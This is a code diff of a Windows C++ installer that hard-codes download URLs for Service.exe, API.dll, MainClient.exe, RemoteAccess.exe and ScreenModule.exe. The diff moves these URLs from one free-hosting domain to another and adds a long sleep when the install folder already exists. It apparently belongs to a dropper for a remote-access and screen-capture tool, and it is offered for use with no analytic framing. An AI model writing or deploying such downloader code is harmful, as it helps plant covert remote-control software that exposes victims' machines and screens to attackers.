@@ -6,11 +6,11 @@
 #pragma comment(lib , "wininet.lib")
 #pragma comment(lib , "urlmon.lib")
 
-wchar_t url_Service[] = L"http://sameaist.beget.tech/Service.exe";
-wchar_t url_API[] = L"http://sameaist.beget.tech/API.dll";
-wchar_t url_MainClient[] = L"http://sameaist.beget.tech/MainClient.exe";
-wchar_t url_RemoteAcces[] = L"http://sameaist.beget.tech/RemoteAccess.exe";
-wchar_t url_ScreenModule[] = L"http://sameaist.beget.tech/ScreenModule.exe";
+wchar_t url_Service[] = L"http://stlr.alwaysdata.net//Service.exe";
+wchar_t url_API[] = L"http://stlr.alwaysdata.net/API.dll";
+wchar_t url_MainClient[] = L"http://stlr.alwaysdata.net/MainClient.exe";
+wchar_t url_RemoteAcces[] = L"http://stlr.alwaysdata.net/RemoteAccess.exe";
+wchar_t url_ScreenModule[] = L"http://stlr.alwaysdata.net/ScreenModule.exe";
 
 std::wstring ServiceFile;
 std::wstring APIFile;
@@ -18,6 +18,7 @@ std::wstring MainClientFile;
 std::string LogFile;
 std::wstring RemoteAccesFile;
 std::wstring ScreenModuleFile;
+
 
 BOOL dirExists(const wchar_t* dir_path) {
 	DWORD dwAttributes = GetFileAttributes(dir_path);
@@ -41,16 +42,18 @@ int main(int argc, char** argv) {
 	std::wstring check_path = system_path;
 	check_path += L"\\RemoteController";
 
-	if (dirExists(check_path.c_str())){
+	if (dirExists(check_path.c_str())) {
 		std::cout << "You already installed Programm" << std::endl;
+		Sleep(1000000000);
 		return -1;
 	}
+
 	if (CreateDirectory(check_path.c_str(), NULL) == 0) {
 		std::cout << "CreateDirectory failed" << std::endl;
 		return -1;
-	}    
+	}
 
-	ServiceFile  = check_path +  L"\\Service.exe";
+	ServiceFile = check_path + L"\\Service.exe";
 	APIFile = check_path + L"\\API.dll";
 	MainClientFile = check_path + L"\\MainClient.exe";
 	RemoteAccesFile = check_path + L"\\RemoteAccess.exe";
